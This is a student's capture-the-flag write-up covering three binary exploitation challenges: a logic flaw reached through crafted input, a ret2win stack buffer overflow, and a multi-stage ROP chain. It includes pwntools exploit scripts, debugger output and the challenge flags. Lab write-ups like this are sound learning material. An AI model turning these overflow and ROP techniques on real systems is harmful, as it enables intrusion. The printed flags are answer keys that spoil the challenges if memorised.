# Binary Exploitation 
## imma_dev
To solve this challenge, we had to figure out how we can access the option of printing the flag by fooling the program into thinking that we are root user. 

### Solution 
To solve this challenge, I followed the steps as listed below: 
- I first decompiled the code to understand what was happening. Seeing that the decomplied code was C++, I had to go online and spend some time learning C++.
- After learning the basic C++, I came back to read this code and I understood that we had to give an input, which would then invoke the `handleOption()` function.
- Going to this function and analyzing it in depth, I learned that the input was wrongly configured. I actually skipped this the first time and went on a tangent which is mentioned in the notes.
- The exact vulnerable code is as follows:
```bash
  std::getline<>((istream *)std::cin,local_5c8);
  std::__cxx11::istringstream::istringstream(local_5a8,local_5c8, 8);
  while( true ) {
    plVar4 = (long *)std::istream::operator>>((istream *)local_5a 8,&local_5d4);
    bVar2 = std::ios::operator.cast.to.bool((ios *)((long)plVar4 + * (long *)(*plVar4 + -0x18)));
```
- In this code, we first used the `getline<>` to get the input from the user, and then store it in `local_5c8`. The next line is used to initialize it, and finally the 3rd line is used to extract the data from the line and store it in the variable `local_5d4`. This is crucial as we entered our input with space in between, which is treated as a delimiter.
- This actually populated the array `local_428` with two different options, `local_428[0]=1` and `local_428[1]=2`.
- The next flaw is in the code given below:
```bash
  if ((local_428[0] == 2) && (_Var3 = geteuid(), _Var3 != 0)) {
    bVar2 = true;
  }
  else {
    bVar2 = false;
  }
```
- This code here only checks the first value in the array, and we had already set this to fail, meaning `bVar2` is false, not true.
- Following the logic in the code, we first enter the `sayHello()` function, and thereafter we enter the `printFlag()` which gives us the flag.
```bash
11:53:25 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads/src  → nc immadeveloper.nitephase.live 61234
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: ishaan
Hi ishaan
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}



^Z
[2]+  Stopped                 nc immadeveloper.nitephase.live 61234
11:54:37 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads/src  → 
```

### Flag
`nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}`

### What I learned
From this challenge, I got a brief intro C++, and some very basic understanding of it. Apart from that, I also learned a lot about the Stack and various types of BinEx that can be done to get the intended result.



### Notes
- I actually think there is another complicated way of solving this, and to do that we need to manipulate the addresses that return, however it was too vast and expansive for me to understand in one go. I learned about Canary and whether instruction written in stack are executable or not.


### References
- https://drive.google.com/drive/u/0/folders/16O68-jD2Vhyfwpcf6zaspXlo7LgtKo9E?ths=true
- https://www.w3schools.com/cpp/cpp_syntax.asp
- hPerttps://r1ru.github.io/categories/binary-exploitation-101
-----------------------------------------------------------------------------------------------------------------------------------
## Performative 
To solve this challenge, we needed to figure out the exact buffer overflow which would allow us to call the `printFlag` function.

### Solution 
To solve this challenge, I followed the steps as below: 
- I first downloaded the ELF file which was available to us in the Google Drive. I then put it in Ghidra to analyze the code. On reading the `main()` in the debugged code, I saw that there was a vulnerability in the code where it takes the input.
```bash
 __isoc23_scanf(&DAT_00402013,buffer);
```
- Now in this, I could see that we can cause an overflow which would allow us to overwrite the return address, so this became a `Ret2Win`.
- On analyzing the function I learned that I needed to calculate the offset of the address that is called when the return line executes. I actually learned a new thing here by learning something called as `cyclic`. This allowed me to calculate the offset pretty quickly and easily.

```bash
pwndbg> cyclic 50 
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
pwndbg> run 
Starting program: /home/ishaan-mishra/Downloads/src/perf 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
Generating your buffer...

Your custom buffer:
========================
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga

Program received signal SIGSEGV, Segmentation fault.
0x00000000004013b2 in main (argc=1, argv=0x7fffffffde78)
    at perf.c:68
.
.
.
────────────────────────────[ STACK ]─────────────────────────────
00:0000│ rsp 0x7fffffffdd58 ◂— 'faaaaaaaga'
01:0008│     0x7fffffffdd60 ◂— 0x7fffff006167 /* 'ga' */
02:0010│     0x7fffffffdd68 —▸ 0x7fffffffde78 —▸ 0x7fffffffe1be ◂— '/home/ishaan-mishra/Downloads/src/perf'
03:0018│     0x7fffffffdd70 ◂— 0x100400040 /* '@' */
04:0020│     0x7fffffffdd78 —▸ 0x4012db (main) ◂— push rbp
05:0028│     0x7fffffffdd80 —▸ 0x7fffffffde78 —▸ 0x7fffffffe1be ◂— '/home/ishaan-mishra/Downloads/src/perf'
06:0030│     0x7fffffffdd88 ◂— 0x94d6d47fca28018d
07:0038│     0x7fffffffdd90 ◂— 1
```
- Using this I was able to see clearly that the offset for getting to the Return address was 40 bytes(5x8).
- Next what I did was I went around looking for the function which prints the flag. I found the function `printFlag` at the memory address `0x4011e9`.
- All that was left to do was create a script, and deliver the payload as needed. The script is as shown below:
```bash
from pwn import *

p = remote('performative.nitephase.live', 56743)
print_flag_addr = 0x4011e9
offset = 40
payload = b'A' * offset + p64(print_flag_addr)
p.recvuntil(b'Buffer: ')
p.sendline(payload)
p.interactive()

```
- On running this script, I got the flag as shown below:
```bash
 ⚙  Mon  1 Dec - 12:41  ~/Downloads/src 
 @ishaan-mishra  python3 solve.py
[+] Opening connection to performative.nitephase.live on port 56743: Done
[*] Switching to interactive mode
Generating your buffer...

Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe9@
nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
[*] Got EOF while reading in interactive
$  [3]  + 18889 suspended (signal)  python3 solve.py

```

### Flag 

`nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}`

### What I learned 

This was the first challenge I solved after EndSems, so this served as a really good revision for all I knew and learned. I learned about using `cyclic` to generate offsets which was becoming a really annoying thing for me at times. Apart from that, I got more comfortable using GDB to gain various inputs and data. 

### Notes
This challenge did take a long time as I was out of touch with the tools. Regardless, it was a great practice question.

### References 
- https://r1ru.github.io/categories/binary-exploitation-101/
- https://drive.google.com/drive/u/1/folders/1nc2RX2paLHo8lKn7lF0ox0HXmqpEW9-A?ths=true
- https://www.sourceware.org/gdb/documentation/
----------------------------------------------------------------------------------------------------------------------------------
## Property in Manipal

----------------------------------------------------------------------------------------------------------------------------------
## IQ Test
This challenge was pretty lengthy, because of the multiple flags, and also shifting from simple buffer overflow to Return Oriented Programming.

### Solution
To solve this challenge, I followed the steps as below: 
- I first read through the main function of the debugged code to understand where the vulnerability was. I found it in the line where we could write upto 512 bytes (`0x200`). This line is as below:
`fgets(local_98,0x200,stdin);`
- After this, I analyzed the file more in depth to learn that the buffer was located at `RBP - 0x98`. This was 152 bytes. So by writing more than 152 bytes, we were overflowing the buffer and overwriting the saved RBP, along with over writing the Return Address.
- Before we actually went ahead and did any of that, we had to solve a quiz first. This quiz actually was to test whether we understood how functions in linux talked to each other or not.
- After solving this quiz, we got an output which told us that we had passed the quiz, but we must move to the address to get the flag. The address was `0x401401`. Using this, we were able to clear the first level and move on. The script for this is as below:
```bash
from pwn import *

context.binary = elf = ELF('./chall')
p = remote("iqtest.nitephase.live", 51823)

log.info("Answering the Quiz...")
p.sendlineafter(b'> ', b'2') # Q1: False
p.sendlineafter(b'> ', b'1') # Q2: RDI
p.sendlineafter(b'> ', b'4') # Q3: RAX

win1_addr = elf.symbols['win1']
ret_gadget = ROP(elf).find_gadget(['ret'])[0] # Align stack

payload = flat(
    b'A' * 152,      # Padding
    ret_gadget,      # Stack Alignment
    win1_addr        # Jump to win1
)

log.info("Sending payload for Win1...")
p.sendline(payload)
print(p.recvall(timeout=3).decode(errors='ignore'))
```
- An important part here was the `ret_gadget`. This helped us in preventing the `movaps` crashes that might take place if it is not 16-bit aligned.
- We got the output as shown below:
```bash
 ⚙  Sat  6 Dec - 15:31  ~/Downloads/src 
 @ishaan-mishra  python3 win1.py
[*] '/home/ishaan-mishra/Downloads/src/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Opening connection to iqtest.nitephase.live on port 51823: Done
[*] Answering the Quiz...
[*] Loaded 16 cached gadgets for './chall'
[*] Sending payload for Win1...
[+] Receiving all data: Done (493B)
[*] Closed connection to iqtest.nitephase.live port 51823
Correct!
You may have passed my test but I must see you display your knowledge before you can access my secrets
Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
You have passed the first challenge. The next one won't be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?}
Continue: 
```
- After doing this, we moved onto the next Lesson, which told us that we must take an artifact of `0xDEADBEEF` to the address given to us. What this meant was we needed to ensure that the value fed into an argument was what we wanted. So I read the binary a bit and discoverd the `win2` function. Now here the `win2` function took an arugment, and we used a gadget to overwrite the register that would be accessed and compared.
- A gadget is basically mix and match that we make of pre-existing code already. We do this because our shellcode might be blocked, but the pre-written code is going to work just fine. 
- On doing this, we were able to rewrite the `RDI` register. This allowed us to meet the criteria of `win2`. Script for it is as below:
```bash
from pwn import *

context.binary = elf = ELF('./chall')
p = remote("iqtest.nitephase.live", 51823)

log.info("Answering the Quiz...")
p.sendlineafter(b'> ', b'2') # Q1: False
p.sendlineafter(b'> ', b'1') # Q2: RDI
p.sendlineafter(b'> ', b'4') # Q3: RAX

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
win2_addr = elf.symbols['win2']

payload = flat(
    b'A' * 152,      # Padding
    ret_gadget,      # Stack Alignment
    pop_rdi, 
    0xdeadbeef,      # Argument 1
    win2_addr        # Jump to win2
)

log.info("Sending payload for Win2...")
p.sendline(payload)
print(p.recvall(timeout=3).decode(errors='ignore'))
```
- A sneaky thing here was that since `win2` did not check whether `win1` was successful or not, we could skip it entirely and move onto `win2`. The output of the script is as shown below:
```bash
 ⚙  Sat  6 Dec - 15:09  ~/Downloads/src 
 @ishaan-mishra  python3 win2.py
[*] '/home/ishaan-mishra/Downloads/src/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Opening connection to iqtest.nitephase.live on port 51823: Done
[*] Answering the Quiz...
[*] Loaded 16 cached gadgets for './chall'
[*] Sending payload for Win2...
[+] Receiving all data: Done (473B)
[*] Closed connection to iqtest.nitephase.live port 51823
Correct!
You may have passed my test but I must see you display your knowledge before you can access my secrets
Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
Final Test: 
```
- Here I discovered the last and final level of this. We needed to get 3 arguments to the final function and have them overwritten with correct values to get the flag.
- We found the address of `win3` function and then used gadgets again to populate the registers which would be accessed. We then called the `win3` function to finally get the correct flag. The script is as below:
```bash
from pwn import *

context.binary = elf = ELF('./chall')
p = remote("iqtest.nitephase.live", 51823)

log.info("Answering the Quiz...")
p.sendlineafter(b'> ', b'2') # Q1: False
p.sendlineafter(b'> ', b'1') # Q2: RDI
p.sendlineafter(b'> ', b'4') # Q3: RAX

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
win3_addr = elf.symbols['win3']

# RDI = 0xDEADBEEF
# RSI = 0xDEAFFACE
# RDX = 0xFEEDCAFE
payload = flat(
    b'A' * 152,          # Padding
    ret_gadget,          # Stack Alignment
    
    pop_rdi, 0xdeadbeef, # Arg 1
    pop_rsi, 0xdeafface, # Arg 2
    pop_rdx, 0xfeedcafe, # Arg 3
    
    win3_addr            # Jump to win3
)

log.info("Sending payload for Win3...")
p.sendline(payload)
print(p.recvall(timeout=3).decode(errors='ignore'))
```
- The output for this is as follow:
```bash
 ⚙  Sat  6 Dec - 15:10  ~/Downloads/src 
 @ishaan-mishra  python3 win3.py  
[*] '/home/ishaan-mishra/Downloads/src/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Opening connection to iqtest.nitephase.live on port 51823: Done
[*] Answering the Quiz...
[*] Loaded 16 cached gadgets for './chall'
[*] Sending payload for Win3...
[+] Receiving all data: Done (312B)
[*] Closed connection to iqtest.nitephase.live port 51823
Correct!
You may have passed my test but I must see you display your knowledge before you can access my secrets
Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
Congratulations. You are deserving of you reward

nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
```

### Flag 
` nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}`

### What I learned 
I learned a lot more about Registers and Pointers in this challenge. The arguments overriding helped clarify the concepts of gadgets to me, because I was not really sure what they are. 

### Notes
I went on a whole lot of tangents in this, because I was not sure how the program was built, but eventually following each thread to where it led, I figured out how the program was built and how to solve it. 

### References
- https://drive.google.com/drive/u/1/folders/1rfX-CpK02zU9whAJl1Na6EeylZW9MJ6I?ths=true
- https://r1ru.github.io/categories/binary-exploitation-101
- Misc Google Searches for Gadgets and Scripts
----------------------------------------------------------------------------------------------------------------------------------
